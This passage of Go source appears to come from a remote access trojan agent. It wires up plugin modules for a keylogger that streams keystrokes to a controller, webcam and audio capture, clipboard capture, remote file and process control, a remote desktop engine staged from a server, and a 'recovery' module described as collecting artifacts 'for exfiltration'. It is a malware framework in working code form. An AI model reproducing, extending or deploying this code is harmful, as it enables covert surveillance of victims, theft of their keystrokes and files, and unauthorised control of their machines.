		EnabledModules: append([]string(nil), runtime.ActiveModules...),
	}

	result, err := plugins.StageRemoteDesktopEngine(stageCtx, manager, client, baseURL, agentID, runtime.AuthKey, runtime.UserAgent, facts, descriptor)
	if err != nil {
		if runtime.Logger != nil {
			runtime.Logger.Printf("remote desktop: engine staging failed: %v", err)
		}
		return fallback()
	}

	version := strings.TrimSpace(result.Manifest.Version)
	if runtime.Extensions != nil {
		var caps []ModuleCapability
		for _, capabilityID := range result.Manifest.Capabilities {
			descriptor, ok := manifest.LookupCapability(capabilityID)
			if !ok {
				continue
			}
			if !strings.EqualFold(descriptor.Module, "remote-desktop") {
				continue
			}
			caps = append(caps, ModuleCapability{
				ID:          descriptor.ID,
				Name:        descriptor.Name,
				Description: descriptor.Description,
			})
		}
		if len(caps) > 0 {
			extension := ModuleExtension{
				Source:       strings.TrimSpace(result.Manifest.ID),
				Version:      version,
				Capabilities: caps,
			}
			if err := runtime.Extensions.RegisterModuleExtension("remote-desktop", extension); err != nil && runtime.Logger != nil {
				runtime.Logger.Printf("remote desktop: failed to register plugin capabilities: %v", err)
			}
		}
	}
	engine := remotedesktop.NewManagedRemoteDesktopEngine(result.EntryPath, version, manager, runtime.Logger)
	return engine, version, nil
}

var (
	audioModuleBaseCapabilities          = []string{"audio.capture", "audio.inject"}
	keyloggerModuleBaseCapabilities      = []string{"keylogger.stream", "keylogger.batch"}
	webcamModuleBaseCapabilities         = []string{"webcam.enumerate", "webcam.stream"}
	clipboardModuleBaseCapabilities      = []string{"clipboard.capture", "clipboard.push"}
	fileManagerModuleBaseCapabilities    = []string{"file-manager.explore", "file-manager.modify"}
	taskManagerModuleBaseCapabilities    = []string{"task-manager.list", "task-manager.control"}
	tcpConnectionsModuleBaseCapabilities = []string{"tcp-connections.enumerate", "tcp-connections.control"}
	clientChatModuleBaseCapabilities     = []string{"client-chat.persistent", "client-chat.alias"}
	systemInfoModuleBaseCapabilities     = []string{"system-info.snapshot", "system-info.telemetry"}
)

func newAudioModule() *audioModule                   { return &audioModule{} }
func newKeyloggerModule() *keyloggerModule           { return &keyloggerModule{} }
func newWebcamModule() *webcamModule                 { return &webcamModule{} }
func newClipboardModule() *clipboardModule           { return &clipboardModule{} }
func newFileManagerModule() *fileManagerModule       { return &fileManagerModule{} }
func newTaskManagerModule() *taskManagerModule       { return &taskManagerModule{} }
func newTCPConnectionsModule() *tcpConnectionsModule { return &tcpConnectionsModule{} }
func newClientChatModule() *clientChatModule         { return &clientChatModule{} }
func newSystemInfoModule() *systemInfoModule         { return &systemInfoModule{} }

type audioModule struct {
	bridge     *audioctrl.AudioBridge
	extensions *moduleExtensionState
	extOnce    sync.Once
}

type keyloggerModule struct {
	manager    *keyloggerctrl.Manager
	extensions *moduleExtensionState
	extOnce    sync.Once
}

type webcamModule struct {
	manager    *webcamctrl.Manager
	extensions *moduleExtensionState
	extOnce    sync.Once
}

func (m *webcamModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "webcam-control",
		Title:       "Webcam Control",
		Description: "Enumerate and control remote webcam devices.",
		Commands:    []string{"webcam-control"},
		Capabilities: []ModuleCapability{
			{
				ID:          "webcam.enumerate",
				Name:        "webcam.enumerate",
				Description: "Enumerate connected webcam devices and capabilities.",
			},
			{
				ID:          "webcam.stream",
				Name:        "webcam.stream",
				Description: "Initiate webcam streaming sessions when supported.",
			},
		},
	}
}

func (m *webcamModule) ID() string {
	return "webcam-control"
}

func (m *webcamModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *webcamModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *webcamModule) extensionState() *moduleExtensionState {
	m.extOnce.Do(func() {
		m.extensions = newModuleExtensionState(webcamModuleBaseCapabilities)
	})
	return m.extensions
}

func (m *webcamModule) RegisterExtension(extension ModuleExtension) error {
	return m.extensionState().register(extension)
}

func (m *webcamModule) UnregisterExtension(source string) error {
	return m.extensionState().unregister(source)
}

func (m *webcamModule) configure(runtime Config) error {
	cfg := webcamctrl.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = webcamctrl.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *webcamModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "webcam subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	state := m.extensionState()
	if len(cmd.Payload) > 0 {
		var payload protocol.WebcamCommandPayload
		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
			action := strings.TrimSpace(strings.ToLower(payload.Action))
			switch action {
			case "", "enumerate", "inventory":
				if !state.hasCapability("webcam.enumerate") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "webcam.enumerate"))
				}
			case "start", "stop", "update":
				if !state.hasCapability("webcam.stream") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "webcam.stream"))
				}
			}
		}
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *webcamModule) Shutdown(context.Context) error {
	return nil
}

func (m *audioModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "audio-control",
		Title:       "Audio Control",
		Description: "Capture and inject audio streams across the remote session.",
		Commands:    []string{"audio-control"},
		Capabilities: []ModuleCapability{
			{
				ID:          "audio.capture",
				Name:        "Audio capture",
				Description: "Capture remote system audio for monitoring and recording.",
			},
			{
				ID:          "audio.inject",
				Name:        "Audio injection",
				Description: "Inject operator-provided audio streams into the remote session.",
			},
		},
	}
}

func (m *audioModule) ID() string {
	return "audio-control"
}

func (m *audioModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *audioModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *audioModule) extensionState() *moduleExtensionState {
	m.extOnce.Do(func() {
		m.extensions = newModuleExtensionState(audioModuleBaseCapabilities)
	})
	return m.extensions
}

func (m *audioModule) RegisterExtension(extension ModuleExtension) error {
	return m.extensionState().register(extension)
}

func (m *audioModule) UnregisterExtension(source string) error {
	return m.extensionState().unregister(source)
}

func (m *audioModule) configure(runtime Config) error {
	cfg := audioctrl.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.bridge == nil {
		m.bridge = audioctrl.NewAudioBridge(cfg)
		return nil
	}
	m.bridge.UpdateConfig(cfg)
	return nil
}

func (m *audioModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.bridge == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "audio subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	state := m.extensionState()
	if len(cmd.Payload) > 0 {
		var payload audioctrl.AudioControlCommandPayload
		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
			action := strings.ToLower(strings.TrimSpace(payload.Action))
			switch action {
			case "", "enumerate", "inventory":
				if !state.hasCapability("audio.capture") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "audio.capture"))
				}
			case "start":
				direction := payload.Direction
				if direction == "" {
					direction = audioctrl.AudioDirectionInput
				}
				required := "audio.capture"
				if direction == audioctrl.AudioDirectionOutput {
					required = "audio.inject"
				}
				if !state.hasCapability(required) {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), required))
				}
			case "stop":
				if !state.hasAnyCapability("audio.capture", "audio.inject") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "audio.capture", "audio.inject"))
				}
			}
		}
	}
	return WrapCommandResult(m.bridge.HandleCommand(ctx, cmd))
}

func (m *audioModule) Shutdown(context.Context) error {
	if m.bridge != nil {
		m.bridge.Shutdown()
	}
	return nil
}

func (m *keyloggerModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "keylogger",
		Title:       "Keylogger",
		Description: "Capture keystrokes and related telemetry from the remote host.",
		Commands:    []string{"keylogger.start", "keylogger.stop"},
		Capabilities: []ModuleCapability{
			{
				ID:          "keylogger.stream",
				Name:        "keylogger.stream",
				Description: "Stream keystroke telemetry to the controller in near real time.",
			},
			{
				ID:          "keylogger.batch",
				Name:        "keylogger.batch",
				Description: "Batch keystrokes offline and upload on a schedule.",
			},
		},
	}
}

func (m *keyloggerModule) ID() string {
	return "keylogger"
}

func (m *keyloggerModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *keyloggerModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *keyloggerModule) extensionState() *moduleExtensionState {
	m.extOnce.Do(func() {
		m.extensions = newModuleExtensionState(keyloggerModuleBaseCapabilities)
	})
	return m.extensions
}

func (m *keyloggerModule) RegisterExtension(extension ModuleExtension) error {
	return m.extensionState().register(extension)
}

func (m *keyloggerModule) UnregisterExtension(source string) error {
	return m.extensionState().unregister(source)
}

func (m *keyloggerModule) configure(runtime Config) error {
	cfg := keyloggerctrl.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = keyloggerctrl.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *keyloggerModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "keylogger subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	state := m.extensionState()
	if len(cmd.Payload) > 0 {
		var payload keyloggerctrl.CommandPayload
		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
			action := strings.TrimSpace(strings.ToLower(payload.Action))
			if action == "" {
				switch strings.ToLower(strings.TrimSpace(cmd.Name)) {
				case "keylogger.start":
					action = "start"
				case "keylogger.stop":
					action = "stop"
				}
			}
			switch action {
			case "start":
				mode := payload.Mode
				if payload.Config != nil && payload.Config.Mode != "" {
					mode = payload.Config.Mode
				}
				if mode == keyloggerctrl.ModeOffline {
					if !state.hasCapability("keylogger.batch") {
						return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "keylogger.batch"))
					}
				} else {
					if !state.hasCapability("keylogger.stream") {
						return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "keylogger.stream"))
					}
				}
			case "stop":
				if !state.hasAnyCapability("keylogger.stream", "keylogger.batch") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "keylogger.stream", "keylogger.batch"))
				}
			}
		}
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *keyloggerModule) Shutdown(context.Context) error {
	if m.manager != nil {
		m.manager.Shutdown(context.Background())
	}
	return nil
}

type clipboardModule struct {
	manager    *clipboard.Manager
	extensions *moduleExtensionState
	extOnce    sync.Once
}

func (m *clipboardModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "clipboard",
		Title:       "Clipboard Manager",
		Description: "Synchronize clipboard data between the operator and remote host.",
		Commands:    []string{"clipboard"},
		Capabilities: []ModuleCapability{
			{
				ID:          "clipboard.capture",
				Name:        "Clipboard capture",
				Description: "Capture clipboard changes emitted by the remote workstation.",
			},
			{
				ID:          "clipboard.push",
				Name:        "Clipboard push",
				Description: "Push operator clipboard payloads to the remote host.",
			},
		},
	}
}

func (m *clipboardModule) ID() string {
	return "clipboard"
}

func (m *clipboardModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *clipboardModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *clipboardModule) extensionState() *moduleExtensionState {
	m.extOnce.Do(func() {
		m.extensions = newModuleExtensionState(clipboardModuleBaseCapabilities)
	})
	return m.extensions
}

func (m *clipboardModule) RegisterExtension(extension ModuleExtension) error {
	return m.extensionState().register(extension)
}

func (m *clipboardModule) UnregisterExtension(source string) error {
	return m.extensionState().unregister(source)
}

func (m *clipboardModule) configure(runtime Config) error {
	cfg := clipboard.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = clipboard.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *clipboardModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "clipboard subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	state := m.extensionState()
	if len(cmd.Payload) > 0 {
		var payload clipboard.ClipboardCommandPayload
		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
			action := strings.TrimSpace(strings.ToLower(payload.Action))
			switch action {
			case "get", "":
				if !state.hasCapability("clipboard.capture") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "clipboard.capture"))
				}
			case "set":
				if !state.hasCapability("clipboard.push") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "clipboard.push"))
				}
			case "sync-triggers":
				if !state.hasCapability("clipboard.capture") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "clipboard.capture"))
				}
			}
		}
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *clipboardModule) Shutdown(context.Context) error {
	if m.manager != nil {
		m.manager.Shutdown()
	}
	return nil
}

type fileManagerModule struct {
	manager    *filemanager.Manager
	extensions *moduleExtensionState
	extOnce    sync.Once
}

func (m *fileManagerModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "file-manager",
		Title:       "File Manager",
		Description: "Inspect and manage the remote file system.",
		Commands:    []string{"file-manager"},
		Capabilities: []ModuleCapability{
			{
				ID:          "file-manager.explore",
				Name:        "file-manager.explore",
				Description: "Enumerate directories and retrieve file contents from the host.",
			},
			{
				ID:          "file-manager.modify",
				Name:        "file-manager.modify",
				Description: "Create, update, move, and delete files and directories on demand.",
			},
		},
	}
}

func (m *fileManagerModule) ID() string {
	return "file-manager"
}

func (m *fileManagerModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *fileManagerModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *fileManagerModule) extensionState() *moduleExtensionState {
	m.extOnce.Do(func() {
		m.extensions = newModuleExtensionState(fileManagerModuleBaseCapabilities)
	})
	return m.extensions
}

func (m *fileManagerModule) RegisterExtension(extension ModuleExtension) error {
	return m.extensionState().register(extension)
}

func (m *fileManagerModule) UnregisterExtension(source string) error {
	return m.extensionState().unregister(source)
}

func (m *fileManagerModule) configure(runtime Config) error {
	cfg := filemanager.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = filemanager.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *fileManagerModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "file manager subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	state := m.extensionState()
	if len(cmd.Payload) > 0 {
		var payload filemanager.FileManagerCommandPayload
		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
			action := strings.TrimSpace(strings.ToLower(payload.Action))
			switch action {
			case "list-directory", "read-file":
				if !state.hasCapability("file-manager.explore") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "file-manager.explore"))
				}
			case "create-entry", "rename-entry", "move-entry", "delete-entry", "update-file":
				if !state.hasCapability("file-manager.modify") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "file-manager.modify"))
				}
			}
		}
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *fileManagerModule) Shutdown(context.Context) error {
	// no teardown required for file system operations today
	return nil
}

type taskManagerModule struct {
	manager    *taskmanager.Manager
	extensions *moduleExtensionState
	extOnce    sync.Once
}

func (m *taskManagerModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "task-manager",
		Title:       "Task Manager",
		Description: "Enumerate and control processes on the remote host.",
		Commands:    []string{"task-manager"},
		Capabilities: []ModuleCapability{
			{
				ID:          "task-manager.list",
				Name:        "task-manager.list",
				Description: "Collect real-time process snapshots with metadata.",
			},
			{
				ID:          "task-manager.control",
				Name:        "task-manager.control",
				Description: "Start and orchestrate process actions on demand.",
			},
		},
	}
}

func (m *taskManagerModule) ID() string {
	return "task-manager"
}

func (m *taskManagerModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *taskManagerModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *taskManagerModule) extensionState() *moduleExtensionState {
	m.extOnce.Do(func() {
		m.extensions = newModuleExtensionState(taskManagerModuleBaseCapabilities)
	})
	return m.extensions
}

func (m *taskManagerModule) RegisterExtension(extension ModuleExtension) error {
	return m.extensionState().register(extension)
}

func (m *taskManagerModule) UnregisterExtension(source string) error {
	return m.extensionState().unregister(source)
}

func (m *taskManagerModule) configure(runtime Config) error {
	if m.manager == nil {
		m.manager = taskmanager.NewManager(runtime.Logger)
		return nil
	}
	m.manager.UpdateLogger(runtime.Logger)
	return nil
}

func (m *taskManagerModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "task manager subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	state := m.extensionState()
	if len(cmd.Payload) > 0 {
		var payload taskmanager.TaskManagerCommandPayload
		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
			switch payload.Request.Operation {
			case taskmanager.OperationList, taskmanager.OperationDetail:
				if !state.hasCapability("task-manager.list") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "task-manager.list"))
				}
			case taskmanager.OperationStart, taskmanager.OperationAction:
				if !state.hasCapability("task-manager.control") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "task-manager.control"))
				}
			}
		}
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *taskManagerModule) Shutdown(context.Context) error {
	// no persistent resources to release today
	return nil
}

type tcpConnectionsModule struct {
	manager    *tcpconnections.Manager
	extensions *moduleExtensionState
	extOnce    sync.Once
}

func (m *tcpConnectionsModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "tcp-connections",
		Title:       "TCP Connections",
		Description: "Enumerate and govern active TCP sockets exposed by the host.",
		Commands:    []string{"tcp-connections"},
		Capabilities: []ModuleCapability{
			{
				ID:          "tcp-connections.enumerate",
				Name:        "tcp-connections.enumerate",
				Description: "Collect real-time socket state with process attribution.",
			},
			{
				ID:          "tcp-connections.control",
				Name:        "tcp-connections.control",
				Description: "Stage enforcement actions for suspicious remote peers.",
			},
		},
	}
}

func (m *tcpConnectionsModule) ID() string {
	return "tcp-connections"
}

func (m *tcpConnectionsModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *tcpConnectionsModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *tcpConnectionsModule) extensionState() *moduleExtensionState {
	m.extOnce.Do(func() {
		m.extensions = newModuleExtensionState(tcpConnectionsModuleBaseCapabilities)
	})
	return m.extensions
}

func (m *tcpConnectionsModule) RegisterExtension(extension ModuleExtension) error {
	return m.extensionState().register(extension)
}

func (m *tcpConnectionsModule) UnregisterExtension(source string) error {
	return m.extensionState().unregister(source)
}

func (m *tcpConnectionsModule) configure(runtime Config) error {
	cfg := tcpconnections.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = tcpconnections.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *tcpConnectionsModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "tcp connections subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	state := m.extensionState()
	if len(cmd.Payload) > 0 {
		var payload tcpconnections.TcpConnectionsCommandPayload
		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
			action := strings.TrimSpace(strings.ToLower(payload.Action))
			if action == "enumerate" || action == "" {
				if !state.hasCapability("tcp-connections.enumerate") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "tcp-connections.enumerate"))
				}
			} else {
				if !state.hasCapability("tcp-connections.control") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "tcp-connections.control"))
				}
			}
		}
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *tcpConnectionsModule) Shutdown(context.Context) error {
	// no shutdown hooks required for TCP connection sweeps today
	return nil
}

type recoveryModule struct {
	manager *recovery.Manager
}

func (m *recoveryModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "recovery",
		Title:       "Recovery Operations",
		Description: "Coordinate staged collection tasks and payload recovery.",
		Commands:    []string{"recovery"},
		Capabilities: []ModuleCapability{
			{
				ID:          "recovery.queue",
				Name:        "Recovery queue",
				Description: "Queue recovery jobs for background execution and monitoring.",
			},
			{
				ID:          "recovery.collect",
				Name:        "Artifact collection",
				Description: "Collect artifacts staged by upstream modules for exfiltration.",
			},
		},
	}
}

func (m *recoveryModule) ID() string {
	return "recovery"
}

func (m *recoveryModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *recoveryModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *recoveryModule) configure(runtime Config) error {
	cfg := recovery.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = recovery.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *recoveryModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "recovery subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *recoveryModule) Shutdown(context.Context) error {
	if m.manager != nil {
		m.manager.Shutdown()
	}
	return nil
}

type clientChatModule struct {
	supervisor *clientchat.Supervisor
	extensions *moduleExtensionState
	extOnce    sync.Once
}

func (m *clientChatModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "client-chat",
		Title:       "Client Chat",
		Description: "Maintain a persistent, controller-managed chat window on the client.",
		Commands:    []string{"client-chat"},
		Capabilities: []ModuleCapability{
			{
				ID:          "client-chat.persistent",
				Name:        "Persistent window",
				Description: "Keep the chat interface open continuously and respawn it if terminated.",
			},
			{
				ID:          "client-chat.alias",
				Name:        "Alias control",
				Description: "Allow the controller to update operator and client aliases in real time.",
			},
		},
	}
}

func (m *clientChatModule) ID() string {
	return "client-chat"
}

func (m *clientChatModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *clientChatModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *clientChatModule) extensionState() *moduleExtensionState {
	m.extOnce.Do(func() {
		m.extensions = newModuleExtensionState(clientChatModuleBaseCapabilities)
	})
	return m.extensions
}

func (m *clientChatModule) RegisterExtension(extension ModuleExtension) error {
	return m.extensionState().register(extension)
}

func (m *clientChatModule) UnregisterExtension(source string) error {
	return m.extensionState().unregister(source)
}

func (m *clientChatModule) configure(runtime Config) error {
	cfg := clientchat.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.supervisor == nil {
		m.supervisor = clientchat.NewSupervisor(cfg)
		return nil
	}
	m.supervisor.UpdateConfig(cfg)
	return nil
}

func (m *clientChatModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.supervisor == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "client chat subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	state := m.extensionState()
	if len(cmd.Payload) > 0 {
		var payload protocol.ClientChatCommandPayload
		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
			action := strings.TrimSpace(strings.ToLower(payload.Action))
			requireAlias := func() bool {
				if payload.Aliases != nil {
					if strings.TrimSpace(payload.Aliases.Operator) != "" || strings.TrimSpace(payload.Aliases.Client) != "" {
						return true
					}
				}
				if payload.Message != nil {
					if strings.TrimSpace(payload.Message.Alias) != "" {
						return true
					}
				}
				return false
			}
			switch action {
			case "", "start":
				if !state.hasCapability("client-chat.persistent") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.persistent"))
				}
				if requireAlias() && !state.hasCapability("client-chat.alias") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.alias"))
				}
			case "configure":
				if payload.Features != nil && !state.hasCapability("client-chat.persistent") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.persistent"))
				}
				if requireAlias() && !state.hasCapability("client-chat.alias") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.alias"))
				}
			case "send-message":
				if !state.hasCapability("client-chat.persistent") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.persistent"))
				}
				if requireAlias() && !state.hasCapability("client-chat.alias") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.alias"))
				}
			case "stop":
				if !state.hasCapability("client-chat.persistent") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.persistent"))
				}
			}
		}
	}
	return WrapCommandResult(m.supervisor.HandleCommand(ctx, cmd))
}

func (m *clientChatModule) Shutdown(ctx context.Context) error {
	if m.supervisor != nil {
		m.supervisor.Shutdown(ctx)
	}
	return nil
}

type systemInfoModule struct {
	collector  *systeminfo.Collector
	extensions *moduleExtensionState
	extOnce    sync.Once
}

func (m *systemInfoModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "system-info",
		Title:       "System Information",
		Description: "Collect host metadata, hardware configuration, and runtime inventory.",
		Commands:    []string{"system-info"},
		Capabilities: []ModuleCapability{
			{
				ID:          "system-info.snapshot",
				Name:        "System snapshot",
				Description: "Produce structured operating system and hardware inventories.",
			},
			{
				ID:          "system-info.telemetry",
				Name:        "System telemetry",
				Description: "Surface live telemetry metrics used by scheduling and recovery modules.",
			},
		},
	}
}

func (m *systemInfoModule) ID() string {
	return "system-info"
}

func (m *systemInfoModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *systemInfoModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *systemInfoModule) extensionState() *moduleExtensionState {
	m.extOnce.Do(func() {
		m.extensions = newModuleExtensionState(systemInfoModuleBaseCapabilities)
	})
	return m.extensions
}

func (m *systemInfoModule) RegisterExtension(extension ModuleExtension) error {
	return m.extensionState().register(extension)
}

func (m *systemInfoModule) UnregisterExtension(source string) error {
	return m.extensionState().unregister(source)
}

func (m *systemInfoModule) configure(runtime Config) error {
	if runtime.Provider == nil {
		return fmt.Errorf("missing agent provider")
	}
	m.collector = systeminfo.NewCollector(runtime.Provider, runtime.BuildVersion)
	return nil
}

func (m *systemInfoModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.collector == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "system information subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	state := m.extensionState()
	if !state.hasCapability("system-info.snapshot") {
		return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "system-info.snapshot"))
	}
	if len(cmd.Payload) > 0 {
		var payload systeminfo.SystemInfoCommandPayload
		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
			if payload.Refresh && !state.hasCapability("system-info.telemetry") {
				return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "system-info.telemetry"))
			}
		}
	}
	return WrapCommandResult(m.collector.HandleCommand(ctx, cmd))
}

